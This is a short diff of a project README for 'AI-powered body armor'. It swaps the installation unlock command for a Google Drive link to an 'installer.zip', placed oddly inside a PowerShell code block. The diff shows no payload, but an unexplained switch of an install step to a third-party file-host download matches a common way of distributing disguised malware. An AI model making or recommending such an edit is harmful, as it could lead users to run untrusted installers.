@@ -41,9 +41,9 @@ This is a private project for the electronic and AI-powered body armor built by 
 - Anker Soundcore Life P2 True Wireless Earbuds
 
 ### Installation Method
-Use our [ZIP installer](https://voltra.ai/raw/installation.zip) here and unlock the software inside using this command:
+Use our [ZIP installer](https://voltra.ai/raw/installation.zip) here and unlock the software inside using this link:
 ```powershell
-voltra -p unlock "Voltera"
+https://drive.google.com/content/i478tfbcyiegf387hf834y7yn87HY/download/installer.zip
 
 ```
 
